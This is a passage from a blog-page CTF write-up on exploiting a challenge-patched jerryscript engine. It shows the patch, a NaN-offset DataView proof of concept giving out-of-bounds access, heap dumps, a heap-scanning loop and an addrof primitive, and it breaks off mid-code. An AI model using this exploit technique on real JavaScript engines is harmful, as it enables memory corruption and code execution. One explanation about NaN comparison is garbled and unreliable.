@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  cherry - Mimic Defense CTF · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Hacking the jerryscript js engine in a chinese CTF">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="cherry - Mimic Defense CTF">
+	<meta name="twitter:description" content="Hacking the jerryscript js engine in a chinese CTF">
+
+<meta property="og:url" content="http://localhost:1313/posts/mimic_cherry/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="cherry - Mimic Defense CTF">
+	<meta property="og:description" content="Hacking the jerryscript js engine in a chinese CTF">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2025-12-12T23:31:15+07:00">
+		<meta property="article:modified_time" content="2025-12-12T23:31:15+07:00">
+		<meta property="article:tag" content="Browser">
+		<meta property="article:tag" content="Linux">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/mimic_cherry/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/mimic_cherry/">
+              cherry - Mimic Defense CTF
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-12-12T23:31:15&#43;07:00">
+                December 12, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a>
+      <span class="separator">•</span>
+    <a href="/authors/leo_something/">Leo_something</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/browser/">Browser</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <h2 id="cherry---mimic-ctf-finals-2025">
+  Cherry - Mimic CTF Finals 2025
+  <a class="heading-link" href="#cherry---mimic-ctf-finals-2025">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Two weeks ago I went to Nanjing, China to take part in the <a href="https://ctftime.org/event/2999"  class="external-link" target="_blank" rel="noopener">2025 Qiangwang Challenge on Cyber Mimic Defense Finals</a> with the ARESx team. Me and <a href="[https://leo1.cc/]%28https://leo1.cc/" title="https://leo1.cc/" >@leo_something</a>) full cleared pwn during the CTF and in this writeup we are going to talk about a really nice browser challenge we encountered.</p>
+<h2 id="overview">
+  Overview
+  <a class="heading-link" href="#overview">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The challenge consisted in a patched version of <a href="https://github.com/jerryscript-project/jerryscript"  class="external-link" target="_blank" rel="noopener">jerryscript</a>, a &ldquo;lightweight JavaScript engine intended to run on a very constrained devices such as microcontrollers&rdquo;.</p>
+<p>The patch was the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold">diff --git a/jerry-core/ecma/operations/ecma-conversion.c b/jerry-core/ecma/operations/ecma-conversion.c
+</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff;font-weight:bold">index cf0c9fde..5c1b7aa2 100644
+</span></span></span><span style="display:flex;"><span><span style="color:#ffa198;background-color:#490202">--- a/jerry-core/ecma/operations/ecma-conversion.c
+</span></span></span><span style="display:flex;"><span><span style="color:#56d364;background-color:#0f5323">+++ b/jerry-core/ecma/operations/ecma-conversion.c
+</span></span></span><span style="display:flex;"><span><span style="color:#79c0ff">@@ -905,7 +905,6 @@ ecma_op_to_integer (ecma_value_t value, /**&lt; ecma value */
+</span></span></span><span style="display:flex;"><span>   /* 3 */
+</span></span><span style="display:flex;"><span>   if (ecma_number_is_nan (number))
+</span></span><span style="display:flex;"><span>   {
+</span></span><span style="display:flex;"><span><span style="color:#ffa198;background-color:#490202">-    *number_p = ECMA_NUMBER_ZERO;
+</span></span></span><span style="display:flex;"><span>     return ECMA_VALUE_EMPTY;
+</span></span><span style="display:flex;"><span>   }
+</span></span></code></pre></div><hr>
+<h2 id="vulnerability">
+  Vulnerability
+  <a class="heading-link" href="#vulnerability">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Looking though the source code of the original non-patched function, we can see that it follows the ECMA-262 standard (as it should), in particular the <a href="https://262.ecma-international.org/6.0/index.html#sec-tointeger"  class="external-link" target="_blank" rel="noopener">ECMA-262 v6, 7.1.4</a> specification on how to implement a correct <code>to_integer</code> operation.</p>
+<p>The entire patched function is this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">ecma_value_t</span>
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">ecma_op_to_integer</span> (<span style="color:#ff7b72">ecma_value_t</span> value, <span style="color:#8b949e;font-style:italic">/**&lt; ecma value */</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff7b72">ecma_number_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>number_p) <span style="color:#8b949e;font-style:italic">/**&lt; [out] ecma number */</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">ECMA_IS_VALUE_ERROR</span> (value))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> value;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* 1 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">ecma_value_t</span> to_number <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ecma_op_to_number</span> (value, number_p);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* 2 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">ECMA_IS_VALUE_ERROR</span> (to_number))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> to_number;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">ecma_number_t</span> number <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">*</span>number_p;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* 3 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">ecma_number_is_nan</span> (number))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// *number_p = ECMA_NUMBER_ZERO;
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ECMA_VALUE_EMPTY;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* 4 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> (<span style="color:#d2a8ff;font-weight:bold">ecma_number_is_zero</span> (number) <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#d2a8ff;font-weight:bold">ecma_number_is_infinity</span> (number))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ECMA_VALUE_EMPTY;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">ecma_number_t</span> floor_fabs <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">ecma_number_t</span>) <span style="color:#d2a8ff;font-weight:bold">floor</span> (<span style="color:#d2a8ff;font-weight:bold">fabs</span> (number));
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">/* 5 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72;font-weight:bold">*</span>number_p <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ecma_number_is_negative</span> (number) <span style="color:#ff7b72;font-weight:bold">?</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#79c0ff;font-weight:bold">floor_fabs</span> : floor_fabs;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> ECMA_VALUE_EMPTY;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>where <code>value</code> is the value to convert and <code>number_p</code> is the pointer to where the output integer should be stored. The return value is just a status that can represent success or a failure error.</p>
+<p>To trigger the patched code we need to provide <code>NaN</code> as <code>value</code>, in this way <code>ecma_op_to_number</code> gets called and we get <code>*number_p = NaN</code>, then <code>number = *number_p</code> and we get inside the patched if statement and return.</p>
+<p>So, long story short: this patch enables us to have <code>*number_p = NaN</code> if we call <code>ecma_op_to_integer</code> with <code>value</code> equals to <code>NaN</code>. This would not have been possible in a correctly implemented<code>to_integer</code>function!</p>
+<p>At this point we were kinda stuck for a bit because we needed to find a higher level function that would rely on <code>to_integer</code> not returning <code>NaN</code> and that would break if it did.
+As <code>NaN</code> is a value stored in memory as <code>0x7ff8000000000000</code> we assumed that this huge number could lead to some sort of OOB somewhere, but after looking though every single call to <code>to_integer</code> we were not able to find a use for it.</p>
+<p>At some point I was looking at this function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>bool ecma_number_is_nan (ecma_number_t num) <span style="color:#8b949e;font-style:italic">/**&lt; ecma-number */</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  bool is_nan <span style="color:#ff7b72;font-weight:bold">=</span> (num <span style="color:#ff7b72;font-weight:bold">!=</span> num);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> is_nan;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And I was like &ldquo;WTF is this comparison?&rdquo;.</p>
+<p>After a quick conversation with GPT I realized that <code>NaN</code> is a special double value that returns <code>False</code> on every comparison, except if it is compared with itself. This widened the attack surface by a lot.</p>
+<p>Then looking again at all the functions using <code>to_integer</code> we stumbled upon the perfect one: <code>ecma_op_dataview_create</code>.</p>
+<blockquote>
+<p>For those of you that don&rsquo;t know, a dataview is an object that lets you read and write raw bytes inside of an <code>ArrayBuffer</code>.
+For dataviews you can also specify an offset and a size, if you want to target only a smaller part of the whole buffer.</p>
+</blockquote>
+<p>That function uses <code>to_index</code> (which internally relies on <code>to_integer</code>) to convert the offset provided, then there are a bunch of <strong>bounds checks</strong> that make sure the dataview doesn&rsquo;t go OOB and finally the object gets set with all the required parameters and returned.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/* 11 - 14. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">ecma_dataview_object_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>dataview_obj_p <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">ecma_dataview_object_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>) object_p;
+</span></span><span style="display:flex;"><span>dataview_obj_p<span style="color:#ff7b72;font-weight:bold">-&gt;</span>header.u.cls.type <span style="color:#ff7b72;font-weight:bold">=</span> ECMA_OBJECT_CLASS_DATAVIEW;
+</span></span><span style="display:flex;"><span>dataview_obj_p<span style="color:#ff7b72;font-weight:bold">-&gt;</span>header.u.cls.u3.length <span style="color:#ff7b72;font-weight:bold">=</span> view_byte_length;
+</span></span><span style="display:flex;"><span>dataview_obj_p<span style="color:#ff7b72;font-weight:bold">-&gt;</span>buffer_p <span style="color:#ff7b72;font-weight:bold">=</span> buffer_p;
+</span></span><span style="display:flex;"><span>dataview_obj_p<span style="color:#ff7b72;font-weight:bold">-&gt;</span>byte_offset <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">uint32_t</span>) offset;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">return</span> <span style="color:#d2a8ff;font-weight:bold">ecma_make_object_value</span> (object_p);
+</span></span></code></pre></div><p>But who cares about the bounds checks, right? We can just bypass them all by setting <code>offset = NaN</code>, at that point all comparisons that involve <code>offset</code> will return <code>False</code> and we can get a dataview with an OOB of arbitrary size!</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> buffer <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> dataView <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> DataView(buffer, <span style="color:#79c0ff">NaN</span>, <span style="color:#a5d6ff">0x10000</span>);
+</span></span></code></pre></div><p><em>This is a PoC that allows us to get a dataview with OOB read/write</em></p>
+<pre tabindex="0"><code>pwndbg&gt; p dataview_obj_p-&gt;header.u.cls.u3.length
+$1 = 65536
+</code></pre><p>Nice, now exploitation time!</p>
+<hr>
+<h2 id="exploitation">
+  Exploitation
+  <a class="heading-link" href="#exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="environment-setup">
+  Environment setup
+  <a class="heading-link" href="#environment-setup">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The provided binary was not compiled with symbols, so we had to rebuild it from source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python tools/build.py --debug
+</span></span></code></pre></div><p><strong>NOTE:</strong> we had to patch the file <code>/CMakeLists.txt</code> to remove the &ldquo;error-on-warning&rdquo; flag. We commented out line 179 and removed the <code>-Werror</code> from line 231.</p>
+<p>To debug the exploit you can break in the function <code>ecma_op_dataview_get_set_view_value</code>, which lets you examine memory access from the OOB dataview. For instance, a breakpoint can be set at <code>ecma-dataview-object.c:373</code>/<code>ecma_op_dataview_get_set_view_value+1172</code>, which stops the program right before access on the dataview memory via <code>set*()</code>  methods.</p>
+<h3 id="leaks">
+  Leaks
+  <a class="heading-link" href="#leaks">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>After just playing around for a bit, and checking what data can be accessed and overridden, we decided to go for leaks first. When doing simple analysis, it seemed like there is an uncompressed heap pointer right after our <code>DataView</code>:</p>
+<pre tabindex="0"><code>0x555555664768 &lt;jerry_global_heap+744&gt;:	0x0000000000000000	0x00250067005b0018
+0x555555664778 &lt;jerry_global_heap+760&gt;:	0x000000010000002c	0x00000312004a6d68
+0x555555664788 &lt;jerry_global_heap+776&gt;:	0x00d4000e000002f3	0x7ff8000000000000
+0x555555664798 &lt;jerry_global_heap+792&gt;:	0x0000000000000000	0x00200074005e0011
+0x5555556647a8 &lt;jerry_global_heap+808&gt;:	0x0000000100200065	0x0000000000000000
+0x5555556647b8 &lt;jerry_global_heap+824&gt;:	0x00000048000068c8	0x010b01aa00000323
+0x5555556647c8 &lt;jerry_global_heap+840&gt;:	0x0064000000640032	0x000100000d00000e
+0x5555556647d8 &lt;jerry_global_heap+856&gt;:	0x0000555555664758	0x0000000000000000
+</code></pre><p>We can easily retrieve this value using any <code>get*()</code> methods on our vulnerable dataview. However, we had to find out the hard way that offsets were not constant. Since the exploit code lives on the heap as well, offsets will change as we are writing the exploit. This is unhandy, but just requires a step we&rsquo;d have done anyway: creating <code>addrof</code> and <code>fakeobj</code> primitives.</p>
+<p>Before that, let&rsquo;s quickly talk about the heap of jerryscript. It&rsquo;s a big memory region adjacent to the BSS where all the objects are stored, as well as the exploit code and metadata. There is no sandbox at all.</p>
+<p>If you want to know more about jerryscript exploitation and internals take a look at <del>the official repo</del> this great writeup from another CTF:
+<a href="https://github.com/pr0cf5/CTF-writeups/blob/master/2021/n1ctf-jerry/writeup.md"  class="external-link" target="_blank" rel="noopener">https://github.com/pr0cf5/CTF-writeups/blob/master/2021/n1ctf-jerry/writeup.md</a></p>
+<h3 id="primitives">
+  Primitives
+  <a class="heading-link" href="#primitives">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Let&rsquo;s start with <code>addrof</code>. for this, we&rsquo;ll try to create an array that is placed after our malicious dataview. We can initialize the array with numbers, to be able to scan and identify the location of the array (more on that in a minute). The actual goal would be to set individual elements of the newly created array to some object, and read it&rsquo;s address back via the out-of-bounds we got.</p>
+<p>As already mentioned, indexes and offsets are problematic. That&rsquo;s why we needed to dynamically identify &lsquo;overlapping&rsquo; offsets from our dataview, and indexes from our new array by essentially scanning the heap. Here is how we did it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">const</span> buffer <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> ArrayBuffer(<span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">const</span> dataView <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> DataView(buffer, <span style="color:#79c0ff">NaN</span>, <span style="color:#a5d6ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> a <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> Array(<span style="color:#a5d6ff">128</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> i<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">128</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>	a[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> fake_idx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0xffffffff</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> off <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> i<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; i<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">0x500</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">const</span> ptr <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getUint32(i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span>(ptr <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x42420</span>) {
+</span></span><span style="display:flex;"><span>		print(<span style="color:#a5d6ff">&#34;found &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> ptr <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">&#34; at offset &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		off <span style="color:#ff7b72;font-weight:bold">=</span> i<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span>;
+</span></span><span style="display:flex;"><span>		dataView.setUint32(off, <span style="color:#a5d6ff">0x43430</span>, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">let</span> j<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">0</span>; j<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#a5d6ff">128</span>; j<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff7b72">if</span>(a[j] <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x4343</span>) {
+</span></span><span style="display:flex;"><span>				print(<span style="color:#a5d6ff">&#34;found overlapping idx &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> j);
+</span></span><span style="display:flex;"><span>				fake_idx <span style="color:#ff7b72;font-weight:bold">=</span> j;
+</span></span><span style="display:flex;"><span>				<span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">if</span>(fake_idx <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0xffffffff</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#ff7b72">break</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This initializes the array with <code>0x4242</code> at first. we then use the oob from our dataview to search for that value in memory. Be careful to search for the actual tagged values. Integers are shifted left by 4 bits, so we gotta find <code>0x4242 &lt;&lt; 4 = 0x42420</code>. Here is how it looks in memory from the start of the dataview:</p>
+<pre tabindex="0"><code>0x555555664788 &lt;jerry_global_heap+776&gt;:	0x0000000000000000	0x0025006b005f0018
+0x555555664798 &lt;jerry_global_heap+792&gt;:	0x000000010000002c	0x0000033200576d68
+0x5555556647a8 &lt;jerry_global_heap+808&gt;:	0x00d4000e00000313	0x7ff8000000000000
+...
+0x555555664838 &lt;jerry_global_heap+952&gt;:	0x0068000000680032	0x000100000000000e
+0x555555664848 &lt;jerry_global_heap+968&gt;:	0x0000555555664778	0xc003000f00000000
+0x555555664858 &lt;jerry_global_heap+984&gt;:	0x0000008000646dc8	0x005401aa0000036b
+...
+0x555555664958 &lt;jerry_global_heap+1240&gt;: 0xd042a8350000001b	0x6f20646e756f6615
+0x555555664968 &lt;jerry_global_heap+1256&gt;: 0x697070616c726576	0x262078646920676e
+0x555555664978 &lt;jerry_global_heap+1272&gt;: 0x0004242000043430	0x0004242000042420
+0x555555664988 &lt;jerry_global_heap+1288&gt;: 0x0004242000042420	0x0004242000042420
+0x555555664998 &lt;jerry_global_heap+1304&gt;: 0x0004242000042420	0x0004242000042420
+0x5555556649a8 &lt;jerry_global_heap+1320&gt;: 0x0004242000042420	0x0004242000042420
+</code></pre><p>If we find this, we got the offset. now we use our oob to change the value in order to also identify the corresponding index. This results in getting an overlapping access by using offset and index. The <code>addrof</code> primitive can now be build like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">function</span> addrof(obj) {
+</span></span><span style="display:flex;"><span>	a[fake_idx] <span style="color:#ff7b72;font-weight:bold">=</span> obj;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">var</span> tagged <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getUint32(off, <span style="color:#79c0ff">true</span>);
+</span></span><span style="display:flex;"><span>	a[fake_idx] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> (tagged <span style="color:#ff7b72;font-weight:bold">&amp;</span> (<span style="color:#ff7b72;font-weight:bold">~</span><span style="color:#a5d6ff">3</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In jerryscript, object pointers are compressed and tagged. We just gotta clear the last two bits.</p>
+<p>Great! We can now get the addresses of objects and calculate offsets between them. This comes in handy for our initial problem: getting a heap leak. We can use <code>addrof</code> to calculate the offset beween the dataview and the underlying buffer to get the correct offset and leak:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#ff7b72">var</span> offset <span style="color:#ff7b72;font-weight:bold">=</span> addrof(dataView) <span style="color:#ff7b72;font-weight:bold">-</span> addrof(buffer)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">var</span> ptr <span style="color:#ff7b72;font-weight:bold">=</span> dataView.getBigInt64(offset, <span style="color:#79c0ff">true</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x72588</span>n;
